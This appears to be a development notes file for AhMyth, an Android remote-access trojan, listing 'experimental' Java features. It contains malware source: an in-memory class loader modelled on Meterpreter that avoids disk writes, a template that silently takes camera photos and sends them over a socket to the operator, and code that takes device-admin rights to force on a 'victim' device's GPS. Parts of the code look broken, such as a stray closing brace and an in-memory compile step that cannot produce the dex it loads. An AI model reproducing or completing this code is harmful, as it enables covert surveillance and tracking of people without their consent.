# <div align="center">Experminetal Features</div>

A file used to store code for experimental client and server features that could be released with future releases if they prove successful.

<details>
  <summary>Experimental Client Features</summary>

## <div align="center">Dynamic "In-Memory at Runtime" Camera Class Generation & Loading</div>

<div align="center">An experimental feature inspired by the Android equivalent of Metasploit Framework's Meterpreter Payload.</div>
<br>

<details>
  <summary>Code</summary>
<br>

- ClassGen.java
> Responsible for Generating and Loading the "CameraManager.java" Class at runtime completely in-memory.
```java
package ahmyth.mine.king.ahmyth;

import com.squareup.javapoet.*;
import org.apache.commons.vfs2.*;
import org.apache.commons.vfs2.provider.ram.RamFileProvider;
import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;
import java.io.OutputStream;
import java.lang.reflect.Method;
import dalvik.system.DexClassLoader;

public class ClassGen {
    public static void main(String[] args) {
        try {
            // Create an in-memory file system manager with RamFileProvider
            FileSystemManager fsManager = VFS.getManager();
            fsManager.addProvider("ram", new RamFileProvider());

            // Define the path to the in-memory Java source file
            String javaFilePath = "ram:///CameraManager.java";

            String camTempSourceCode = CamTemp.CAMERA_SOURCE_CODE;

            // Create an in-memory file for the Java source code
            FileObject javaFile = fsManager.resolveFile(javaFilePath);
            
            // Write the generated Java source code to the in-memory file
            try (OutputStream os = javaFile.getContent().getOutputStream()) {
                os.write(camTempSourceCode.getBytes());
            }

            // Define the path to the in-memory .dex file
            String dexPath = "ram:///CameraManager.dex";

            // Create an in-memory file for the compiled .dex
            FileObject dexFile = fsManager.resolveFile(dexPath);

            TypeSpec generatedClass = TypeSpec.classBuilder("CameraManager") // Change the class name here
                    .addCode(camTempSourceCode)
                    .build();

            JavaFile javaFileObj = JavaFile.builder("ahmyth.mine.king.ahmyth", generatedClass)
                    .build();

            String javaCode = javaFileObj.toString();

            JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
            int compilationResult = compiler.run(null, null, null, javaFilePath); // Compile the in-memory Java source file

            if (compilationResult == 0) {
                System.out.println("Compilation succeeded.");
            } else {
                System.err.println("Compilation failed.");
                System.exit(compilationResult);
            }

            // Load the compiled .dex from in-memory
            ClassLoader classLoader = new DexClassLoader(
                    dexFile.getURL().toString(),
                    null,
                    null,
                    ClassLoader.getSystemClassLoader()
            );

            executeDynamicallyGeneratedClass(classLoader);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void executeDynamicallyGeneratedClass(ClassLoader classLoader) throws Exception {
        Class<?> generatedClass = classLoader.loadClass("ahmyth.mine.king.ahmyth.CameraManager"); // Change the class name here
        Object generatedInstance = generatedClass.getDeclaredConstructor().newInstance();
    }
}
```
<br>

- CamTemp.java
> "CameraManger" Template file required for class file generation.
```java
package ahmyth.mine.king.ahmyth;

public class CamTemp {
    public static final String CAMERA_SOURCE_CODE =
            "package ahmyth.mine.king.ahmyth;\n" +
            "import android.content.Context;\n" +
            "import android.content.pm.PackageManager;\n" +
            "import android.graphics.Bitmap;\n" +
            "import android.graphics.BitmapFactory;\n" +
            "import android.graphics.SurfaceTexture;\n" +
            "import android.hardware.Camera;\n" +
            "import android.hardware.Camera.PictureCallback;\n" +
            "import android.hardware.Camera.Parameters;\n" +
            "import org.json.JSONArray;\n" +
            "import org.json.JSONException;\n" +
            "import org.json.JSONObject;\n" +
            "import java.io.ByteArrayOutputStream;\n" +
            "public class CameraManager {\n" +
            "    private Context context;\n" +
            "    private Camera camera;\n" +
            "    public CameraManager(Context context) {\n" +
            "        this.context = context;\n" +
            "    }\n" +
            "    public void startUp(int cameraID) {\n" +
            "        camera = Camera.open(cameraID);\n" +
            "        Parameters parameters = camera.getParameters();\n" +
            "        camera.setParameters(parameters);\n" +
            "        try {\n" +
            "            camera.setPreviewTexture(new SurfaceTexture(0));\n" +
            "            camera.startPreview();\n" +
            "        } catch (Exception e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "        camera.takePicture(null, null, new PictureCallback() {\n" +
            "            @Override\n" +
            "            public void onPictureTaken(byte[] data, Camera camera) {\n" +
            "                releaseCamera();\n" +
            "                sendPhoto(data);\n" +
            "            }\n" +
            "        });\n" +
            "    }\n" +
            "    private void sendPhoto(byte[] data) {\n" +
            "        try {\n" +
            "            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);\n" +
            "            ByteArrayOutputStream bos = new ByteArrayOutputStream();\n" +
            "            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);\n" +
            "            JSONObject object = new JSONObject();\n" +
            "            object.put(\"image\", true);\n" +
            "            object.put(\"buffer\", bos.toByteArray());\n" +
            "            IOSocket.getInstance().getIoSocket().emit(\"x0000ca\", object);\n" +
            "        } catch (JSONException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "    private void releaseCamera() {\n" +
            "        if (camera != null) {\n" +
            "            camera.stopPreview();\n" +
            "            camera.release();\n" +
            "            camera = null;\n" +
            "        }\n" +
            "    }\n" +
            "    public JSONObject findCameraList() {\n" +
            "        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {\n" +
            "            return null;\n" +
            "        }\n" +
            "        try {\n" +
            "            JSONObject cameras = new JSONObject();\n" +
            "            JSONArray list = new JSONArray();\n" +
            "            cameras.put(\"camList\", true);\n" +
            "            int numberOfCameras = Camera.getNumberOfCameras();\n" +
            "            for (int i = 0; i < numberOfCameras; i++) {\n" +
            "                Camera.CameraInfo info = new Camera.CameraInfo();\n" +
            "                Camera.getCameraInfo(i, info);\n" +
            "                JSONObject jo = new JSONObject();\n" +
            "                jo.put(\"id\", i);\n" +
            "                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {\n" +
            "                    jo.put(\"name\", \"Front\");\n" +
            "                } else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {\n" +
            "                    jo.put(\"name\", \"Back\");\n" +
            "                } else {\n" +
            "                    jo.put(\"name\", \"Other\");\n" +
            "                }\n" +
            "                list.put(jo);\n" +
            "            }\n" +
            "            cameras.put(\"list\", list);\n" +
            "            return cameras;\n" +
            "        } catch (JSONException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "        return null;\n" +
            "    }\n" +
            "}\n" +
            "}";
}
```

</details>

<details>
  <summary>Explanation</summary>
  <br>

The provided code in the dropdown tab below this one, performs all of the following operations listed below, dynamically in memory, meaning that nothing gets written to disk (aka the Android fileSystem)
  
  <br>

## <div align="center"><ins>Generation Phase</div></ins>
1. **In memory:** Creates an in-memory file system manager with the *RamFileProvider*.
2. **In memory:** Defines the path to the in-memory Java source file `("ram:///CameraManager.java")`.
3. **In memory:** Retrieves the source code for the `"CameraManager"` class from `"CamTemp.CAMERA_SOURCE_CODE."`
4. **In memory:** Creates an in-memory file to store the Java source code.
5. **In memory:** Writes the generated Java source code to the in-memory file.

## <div align="center"><ins>Loading Phase</div></ins>
6. **In memory:** Defines the path to the in-memory *.dex* file `("ram:///CameraManager.dex")`.
7. **In memory:** Creates an in-memory file to store the compiled *.dex* file.
8. **In memory:** Defines the structure and content of the `"CameraManager"` class using *JavaPoet*.
9. **In memory:** Converts the JavaPoet representation of the class to a string.
10. **In memory:** Compiles the in-memory Java source code into a .dex file using the *Java Compiler*.
11. **In memory:** Checks the compilation result, and if successful, prints "Compilation succeeded."
12. **In memory:** Loads the compiled .dex file into memory using a *DexClassLoader*.
13. **In memory:** Attempts to create an instance of the dynamically generated `"CameraManager"` class in memory.

**Reiteration:**

In both the Generation and Loading Phases, most actions are performed in memory. The code dynamically generates, compiles, and loads the `"CameraManager"` class along with its source code and compiled *.dex* file, all within the program's memory space. The only actions not performed in memory are related to the file system, where it writes the generated Java source code and reads the compiled *.dex* file.

</details>
<br>

## <div align="center">Device Admin Privileges</div>

This will hopefully give the AhMyth Payload Administrator Privileges for future features.

<details>
  <summary>Code</summary>
  <br>

- DeviceAdmin.java
```java
package ahmyth.mine.king.ahmyth;

import android.app.admin.DeviceAdminReceiver;

import android.app.admin.DevicePolicyManager;

import android.content.ComponentName;

import android.content.Context;

public class DeviceAdmin extends DeviceAdminReceiver {

    static DevicePolicyManager getDPM(Context context) {

        return (DevicePolicyManager)context.getSystemService(Context.DEVICE_POLICY_SERVICE);

    }

    public static ComponentName getComponentName(Context context) {

        return new ComponentName(context.getApplicationContext(), DeviceAdmin.class);

    }

}
```
</details>
<br>
  
## <div align="center">Automatically Enable Victim GPS</div>

This will hopefully allow automatic enabling of the victim device's GPS, Device Administration Privileges are required for this to work, hence the need for the **DeviceAdmin.java** code above.

<details>
  <summary>Code</summary>
  <br>
  
- LocationManager.java
```java
    private void activateGps(Context context) {

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);

        if (!prefs.getBoolean("allow_location_modechange", false))

            return;

        if (!DeviceAdmin.getDPM(context).isAdminActive(DeviceAdmin.getComponentName(context)))

            return;

        if (!DeviceAdmin.getDPM(context).isDeviceOwnerApp(context.getApplicationContext().getPackageName()))

            return;

        DeviceAdmin.getDPM(context).setSecureSetting(

                DeviceAdmin.getComponentName(context),

                Settings.Secure.LOCATION_MODE,

                Integer.toString(Settings.Secure.LOCATION_MODE_HIGH_ACCURACY)

        );

        Log.d("Done", "Forcefully enabled GPS");

    }

    private void getLocation(Context context) throws SecurityException {

        activateGps(context);

        LocationManager locationManager = (LocationManager) context.getApplicationContext().getSystemService(Context.LOCATION_SERVICE);

        locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, null);

    }
```
<br>

- Settings.java
```java
        perms.put("allow_location", new String[]{

                Manifest.permission.ACCESS_FINE_LOCATION,

        });

        perms.put("allow_location_modechange", new String[]{

                Manifest.permission.BIND_DEVICE_ADMIN,

        });
```
</details>

</details>

<details>
  <summary>Experminetal Server Features</summary>

### Nothing to show.

</details>
